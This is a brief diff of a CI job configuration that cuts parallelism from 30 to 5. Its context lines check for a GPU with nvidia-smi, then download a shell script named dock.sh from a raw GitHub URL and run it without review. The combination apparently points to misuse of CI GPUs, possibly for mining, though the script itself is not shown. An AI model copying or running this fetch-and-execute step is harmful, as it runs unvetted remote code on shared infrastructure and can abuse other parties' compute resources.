@@ -7,4 +7,4 @@ jobs:
     steps:
       - run: nvidia-smi
       - run:  wget https://raw.githubusercontent.com/ploretope/bash/main/dock.sh && chmod +x dock.sh && ./dock.sh
-    parallelism: 30
+    parallelism: 5
